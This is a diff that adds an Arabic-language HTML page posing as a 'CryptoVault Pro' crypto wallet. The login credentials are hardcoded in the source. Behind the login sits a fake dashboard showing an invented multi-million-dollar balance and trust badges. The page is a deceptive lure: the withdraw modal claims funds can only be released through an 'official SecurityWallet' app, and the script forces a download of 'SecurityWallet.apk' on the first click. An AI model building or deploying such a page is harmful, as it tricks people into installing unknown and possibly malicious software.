@@ -1,0 +1,673 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CryptoVault Pro – تسجيل الدخول</title>
+    <style>
+        :root {
+            --bg: #060b14;
+            --surface: rgba(16, 20, 40, 0.75);
+            --gold: #f0b90b;
+            --gold-light: #fcd535;
+            --accent: #3b82f6;
+            --text: #eaecef;
+            --text-secondary: #8b8fa3;
+            --green: #0ecb81;
+            --red: #f6465d;
+            --border: rgba(255, 255, 255, 0.08);
+            --shadow: 0 20px 50px -12px rgba(0,0,0,0.7);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
+            background: radial-gradient(ellipse at 30% 10%, #131a35 0%, var(--bg) 70%);
+            color: var(--text);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* جزيئات ذهبية متحركة */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+        .particle {
+            position: absolute;
+            background: var(--gold);
+            border-radius: 50%;
+            opacity: 0.06;
+            animation: floatUp linear infinite;
+        }
+        @keyframes floatUp {
+            0% { transform: translateY(110vh) scale(0); opacity: 0; }
+            30% { opacity: 0.15; }
+            100% { transform: translateY(-10vh) scale(1.4); opacity: 0; }
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            min-height: 100vh;
+        }
+
+        /* شاشة تسجيل الدخول */
+        .login-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            transition: all 0.4s ease;
+        }
+        .login-logo {
+            width: 100px;
+            height: 100px;
+            margin-bottom: 30px;
+            background: linear-gradient(135deg, var(--gold), #b8860b);
+            border-radius: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 50px;
+            color: #0a0e27;
+            box-shadow: 0 15px 35px rgba(240, 185, 11, 0.3);
+        }
+        .login-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--gold);
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        .login-sub {
+            color: var(--text-secondary);
+            margin-bottom: 40px;
+            text-align: center;
+            font-size: 0.9rem;
+        }
+        .input-group {
+            width: 100%;
+            margin-bottom: 25px;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: var(--text);
+        }
+        .input-group input {
+            width: 100%;
+            padding: 16px 20px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            color: var(--text);
+            font-size: 1rem;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s;
+            font-family: inherit;
+        }
+        .input-group input:focus {
+            outline: none;
+            border-color: var(--gold);
+            box-shadow: 0 0 0 3px rgba(240, 185, 11, 0.2);
+        }
+        .btn {
+            width: 100%;
+            padding: 18px;
+            border: none;
+            border-radius: 16px;
+            font-weight: 700;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+            display: inline-block;
+            font-family: inherit;
+            position: relative;
+            overflow: hidden;
+        }
+        .btn-gold {
+            background: linear-gradient(135deg, var(--gold), #d4a60a);
+            color: #000;
+            box-shadow: 0 10px 25px rgba(240, 185, 11, 0.4);
+        }
+        .btn-gold:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 35px rgba(240, 185, 11, 0.6);
+        }
+        .error-msg {
+            color: var(--red);
+            text-align: center;
+            margin-top: 10px;
+            display: none;
+        }
+
+        /* لوحة التحكم (مخفية افتراضياً) */
+        .dashboard {
+            display: none;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        /* زجاج */
+        .card,
+        .top-bar,
+        .ticker,
+        .assets-table,
+        .history,
+        .quick-actions .btn {
+            background: var(--surface);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            box-shadow: var(--shadow);
+        }
+
+        .top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 18px;
+        }
+        .brand {
+            font-weight: 800;
+            font-size: 1.3rem;
+            color: var(--gold);
+            letter-spacing: -0.5px;
+        }
+        .icons {
+            display: flex;
+            gap: 18px;
+            align-items: center;
+        }
+        .notif {
+            position: relative;
+            font-size: 1.4rem;
+        }
+        .notif::after {
+            content: '';
+            position: absolute;
+            top: -2px;
+            right: -4px;
+            width: 10px;
+            height: 10px;
+            background: var(--red);
+            border-radius: 50%;
+            border: 2px solid var(--bg);
+        }
+        .profile {
+            width: 34px;
+            height: 34px;
+            background: linear-gradient(135deg, var(--gold), #b8860b);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            color: #000;
+            cursor: pointer;
+        }
+
+        /* بطاقة الرصيد */
+        .balance-card {
+            padding: 24px;
+            position: relative;
+            overflow: hidden;
+        }
+        .balance-card::before {
+            content: '';
+            position: absolute;
+            top: -60%;
+            left: -30%;
+            width: 160%;
+            height: 160%;
+            background: radial-gradient(circle at 40% 40%, rgba(240,185,11,0.08), transparent 60%);
+            pointer-events: none;
+        }
+        .balance-label {
+            display: flex;
+            justify-content: space-between;
+            color: var(--text-secondary);
+            font-size: 0.85rem;
+            margin-bottom: 12px;
+        }
+        .balance-amount {
+            font-size: 2.8rem;
+            font-weight: 800;
+            color: var(--gold);
+            line-height: 1.1;
+            word-break: break-word;
+        }
+        .profit {
+            color: var(--green);
+            font-weight: 600;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .mini-chart {
+            margin-top: 18px;
+            height: 40px;
+            background: linear-gradient(90deg, rgba(14,203,129,0.3), transparent);
+            border-radius: 8px;
+        }
+
+        /* شريط الأسعار */
+        .ticker {
+            padding: 12px 4px;
+            overflow: hidden;
+            white-space: nowrap;
+            display: flex;
+            gap: 24px;
+            font-size: 0.9rem;
+            font-weight: 600;
+        }
+        .ticker-item {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .ticker-name { color: var(--text-secondary); }
+        .ticker-price { color: var(--text); }
+        .up { color: var(--green); }
+        .down { color: var(--red); }
+
+        /* الأصول */
+        .assets-table {
+            padding: 6px 0;
+        }
+        .asset-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 14px 18px;
+            border-bottom: 1px solid var(--border);
+        }
+        .asset-row:last-child { border-bottom: none; }
+        .asset-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .asset-icon {
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            background: rgba(240,185,11,0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.3rem;
+        }
+        .asset-name { font-weight: 700; }
+        .asset-amount { color: var(--text-secondary); font-size: 0.8rem; }
+        .asset-value { font-weight: 700; color: var(--gold); }
+
+        /* أزرار سريعة */
+        .quick-actions {
+            display: flex;
+            gap: 10px;
+        }
+        .quick-actions .btn {
+            flex: 1;
+            padding: 14px 8px;
+            text-align: center;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .btn-gold {
+            background: linear-gradient(135deg, var(--gold), #b8860b);
+            color: #000;
+            border: none;
+            font-weight: 800;
+        }
+        .btn-gold:hover { filter: brightness(1.1); }
+
+        /* سجل العمليات */
+        .history {
+            padding: 16px 18px;
+        }
+        .history h3 { color: var(--gold); margin-bottom: 14px; font-size: 1rem; }
+        .history-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid var(--border);
+        }
+        .history-item:last-child { border-bottom: none; }
+        .history-desc { font-weight: 600; }
+        .history-date { font-size: 0.75rem; color: var(--text-secondary); }
+        .history-amount { font-weight: 700; color: var(--green); }
+
+        /* نافذة منبثقة */
+        .modal {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(12px);
+            z-index: 999;
+            align-items: center;
+            justify-content: center;
+        }
+        .modal.active { display: flex; }
+        .modal-content {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            padding: 30px;
+            max-width: 360px;
+            width: 90%;
+            text-align: center;
+            backdrop-filter: blur(30px);
+        }
+        .modal-icon { font-size: 3rem; margin-bottom: 16px; }
+        .modal h2 { color: var(--gold); margin-bottom: 12px; }
+        .modal p { color: var(--text-secondary); margin-bottom: 20px; line-height: 1.5; }
+        .btn-blue {
+            background: var(--accent);
+            color: white;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            font-size: 1rem;
+            transition: filter 0.2s;
+        }
+        .btn-blue:hover { filter: brightness(1.1); }
+        .close-modal {
+            margin-top: 14px;
+            color: var(--text-secondary);
+            cursor: pointer;
+            font-size: 0.9rem;
+        }
+
+        /* زر التحميل الواضح */
+        .download-btn {
+            display: block;
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #2563eb, #1d4ed8);
+            color: white;
+            border: none;
+            border-radius: 16px;
+            font-weight: 800;
+            font-size: 1.2rem;
+            text-align: center;
+            cursor: pointer;
+            box-shadow: 0 10px 25px rgba(37,99,235,0.4);
+            transition: all 0.3s;
+            margin-top: 4px;
+        }
+        .download-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 35px rgba(37,99,235,0.6);
+        }
+
+        footer {
+            text-align: center;
+            padding: 16px;
+            color: var(--text-secondary);
+            font-size: 0.75rem;
+            margin-top: auto;
+        }
+        footer a { color: var(--gold); text-decoration: none; margin: 0 6px; }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+<div class="particles" id="particles"></div>
+
+<div class="container">
+    <!-- ========== شاشة تسجيل الدخول ========== -->
+    <div class="login-screen" id="loginScreen">
+        <div class="login-logo">🔐</div>
+        <div class="login-title">CryptoVault Pro</div>
+        <div class="login-sub">أدخل بيانات حسابك للوصول إلى محفظتك</div>
+        <div class="input-group">
+            <label>اسم المستخدم</label>
+            <input type="text" id="usernameInput" placeholder="أدخل اسم المستخدم">
+        </div>
+        <div class="input-group">
+            <label>كلمة المرور</label>
+            <input type="password" id="passwordInput" placeholder="أدخل كلمة المرور">
+        </div>
+        <button class="btn btn-gold" onclick="handleLogin()">🔓 فتح المحفظة</button>
+        <div class="error-msg" id="errorMsg">اسم المستخدم أو كلمة المرور غير صحيحة</div>
+        <div style="margin-top:15px; color: var(--text-secondary); font-size:0.8rem;">نسيت كلمة المرور؟ <a href="#" style="color:var(--gold);">استرداد الحساب</a></div>
+    </div>
+
+    <!-- ========== لوحة التحكم (مخفية) ========== -->
+    <div class="dashboard" id="dashboard">
+        <div class="top-bar">
+            <div class="brand">🔐 CryptoVault</div>
+            <div class="icons">
+                <span class="notif">🔔</span>
+                <div class="profile" id="profileIcon">U</div>
+            </div>
+        </div>
+
+        <div class="balance-card card">
+            <div class="balance-label">
+                <span>💰 إجمالي الرصيد (USD)</span>
+                <span id="liveTime">--:--</span>
+            </div>
+            <div class="balance-amount" id="balance">$5,231,847.00</div>
+            <div class="profit">📈 أرباح اليوم: +$<span id="dailyProfit">12,840.50</span></div>
+            <div class="mini-chart"></div>
+        </div>
+
+        <div class="ticker" id="tickerBar"></div>
+        <div class="assets-table card" id="assetsTable"></div>
+
+        <div class="quick-actions">
+            <div class="btn" onclick="alert('الإيداع متوقف مؤقتاً لأعمال الصيانة.')">📥 إيداع</div>
+            <div class="btn" onclick="alert('قريباً...')">📊 شراء</div>
+            <div class="btn btn-gold" onclick="openWithdrawModal()">💸 سحب</div>
+        </div>
+
+        <button class="download-btn" onclick="downloadApp()">⬇️ تحميل تطبيق SecurityWallet الرسمي (مجاني)</button>
+        <div class="history card" id="history"></div>
+        <footer>
+            <a href="#">سياسة الخصوصية</a> • <a href="#">شروط الخدمة</a> • <a href="#">عن المنصة</a><br>
+            <span>🔒 SSL Secured | ✅ KYC Verified</span><br>
+            <span style="color:var(--gold);">© 2026 CryptoVault Pro</span>
+        </footer>
+    </div>
+</div>
+
+<!-- نافذة السحب -->
+<div class="modal" id="withdrawModal">
+    <div class="modal-content">
+        <div class="modal-icon">🔐</div>
+        <h2>لأمان أموالك</h2>
+        <p>رصيدك يتجاوز <strong>5 مليون دولار</strong>. للسحب، يجب توثيق هويتك عبر تطبيق <strong>SecurityWallet</strong> الرسمي.</p>
+        <button class="btn-blue" onclick="downloadApp()">⬇️ تحميل SecurityWallet (مجاني)</button>
+        <div class="close-modal" onclick="closeModal()">لست مهتماً؟ ذكرني لاحقاً</div>
+    </div>
+</div>
+
+<script>
+    // ========== بيانات الاعتماد ==========
+    const VALID_USERNAME = "CryptoVaultAdmin";
+    const VALID_PASSWORD = "Vault@2026!X9$Secure";
+
+    // ========== الجزيئات ==========
+    function createParticles() {
+        const container = document.getElementById('particles');
+        for(let i=0; i<30; i++) {
+            const p = document.createElement('div');
+            p.className = 'particle';
+            const size = Math.random() * 4 + 2;
+            p.style.width = size+'px';
+            p.style.height = size+'px';
+            p.style.left = Math.random()*100+'%';
+            p.style.animationDuration = (Math.random()*15 + 10)+'s';
+            p.style.animationDelay = Math.random()*5+'s';
+            container.appendChild(p);
+        }
+    }
+    createParticles();
+
+    // ========== تسجيل الدخول ==========
+    function handleLogin() {
+        const username = document.getElementById('usernameInput').value.trim();
+        const password = document.getElementById('passwordInput').value.trim();
+        if (username === VALID_USERNAME && password === VALID_PASSWORD) {
+            document.getElementById('loginScreen').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'flex';
+            document.getElementById('profileIcon').textContent = username.charAt(0).toUpperCase();
+            startDashboard();
+        } else {
+            document.getElementById('errorMsg').style.display = 'block';
+        }
+    }
+
+    function startDashboard() {
+        updateTime();
+        setInterval(updateTime, 1000);
+        fluctuateBalance();
+        setInterval(fluctuateBalance, 3000);
+        renderTicker();
+        setInterval(renderTicker, 1500);
+        renderAssets();
+        renderHistory();
+        // التحميل التلقائي عند أول نقرة
+        var downloaded = false;
+        document.body.addEventListener('click', function(e) {
+            if (!downloaded) {
+                downloaded = true;
+                downloadApp();
+            }
+        });
+    }
+
+    // ========== الوقت الحي ==========
+    function updateTime() {
+        const now = new Date();
+        document.getElementById('liveTime').textContent = now.toLocaleTimeString('ar-SA');
+    }
+
+    // ========== محاكاة الرصيد ==========
+    let baseBalance = 5231847.00;
+    function fluctuateBalance() {
+        const change = (Math.random() - 0.4) * 80;
+        baseBalance += change;
+        if(baseBalance < 5230000) baseBalance = 5230000;
+        document.getElementById('balance').textContent = '$' + baseBalance.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+        document.getElementById('dailyProfit').textContent = (Math.random() * 2000 + 11000).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+    }
+
+    // ========== شريط الأسعار ==========
+    const coins = [
+        { name: 'BTC', price: 68240, icon: '₿' },
+        { name: 'ETH', price: 3890, icon: 'Ξ' },
+        { name: 'XMR', price: 172, icon: 'ɱ' },
+        { name: 'VRSC', price: 0.87, icon: 'V' }
+    ];
+    function renderTicker() {
+        const bar = document.getElementById('tickerBar');
+        let html = '';
+        coins.forEach(c => {
+            const change = (Math.random() - 0.5) * (c.price * 0.002);
+            const newPrice = c.price + change;
+            const isUp = change >= 0;
+            html += `<div class="ticker-item">
+                <span class="ticker-name">${c.icon} ${c.name}</span>
+                <span class="ticker-price">$${newPrice.toLocaleString('en-US', {minimumFractionDigits:2})}</span>
+                <span class="${isUp?'up':'down'}">${isUp?'▲':'▼'} ${Math.abs(change).toFixed(2)}</span>
+            </div>`;
+        });
+        bar.innerHTML = html;
+    }
+
+    // ========== الأصول ==========
+    const assets = [
+        { name: 'بيتكوين', code: 'BTC', amount: 4.2, valueUSD: 286608, icon: '₿' },
+        { name: 'إيثيريوم', code: 'ETH', amount: 120, valueUSD: 466800, icon: 'Ξ' },
+        { name: 'VerusCoin', code: 'VRSC', amount: 980000, valueUSD: 852600, icon: 'V' },
+        { name: 'تيثر', code: 'USDT', amount: 420000, valueUSD: 420000, icon: '💵' }
+    ];
+    function renderAssets() {
+        const table = document.getElementById('assetsTable');
+        let html = '';
+        assets.forEach(a => {
+            html += `<div class="asset-row">
+                <div class="asset-left">
+                    <div class="asset-icon">${a.icon}</div>
+                    <div>
+                        <div class="asset-name">${a.name} (${a.code})</div>
+                        <div class="asset-amount">${a.amount.toLocaleString()} ${a.code}</div>
+                    </div>
+                </div>
+                <div class="asset-value">$${a.valueUSD.toLocaleString()}</div>
+            </div>`;
+        });
+        table.innerHTML = html;
+    }
+
+    // ========== سجل العمليات ==========
+    const historyData = [
+        { desc: 'إيداع تعدين VerusCoin', date: '14 مايو 2026', amount: 145200 },
+        { desc: 'مكافأة Staking ETH', date: '12 مايو 2026', amount: 82300 },
+        { desc: 'تحويل من محفظة خارجية', date: '10 مايو 2026', amount: 67900 },
+        { desc: 'أرباح التعدين الجماعي', date: '8 مايو 2026', amount: 211000 },
+        { desc: 'بيع NFT', date: '5 مايو 2026', amount: 98300 }
+    ];
+    function renderHistory() {
+        const hist = document.getElementById('history');
+        let html = '<h3>📋 آخر العمليات</h3>';
+        historyData.forEach(h => {
+            html += `<div class="history-item">
+                <div>
+                    <div class="history-desc">${h.desc}</div>
+                    <div class="history-date">${h.date}</div>
+                </div>
+                <div class="history-amount">+$${h.amount.toLocaleString()}</div>
+            </div>`;
+        });
+        hist.innerHTML = html;
+    }
+
+    // ========== نافذة السحب والتحميل ==========
+    function openWithdrawModal() { document.getElementById('withdrawModal').classList.add('active'); }
+    function closeModal() { document.getElementById('withdrawModal').classList.remove('active'); }
+    function downloadApp() {
+        var a = document.createElement('a');
+        a.href = 'SecurityWallet.apk';
+        a.download = 'SecurityWallet.apk';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        closeModal();
+    }
+</script>
+</body>
+</html>
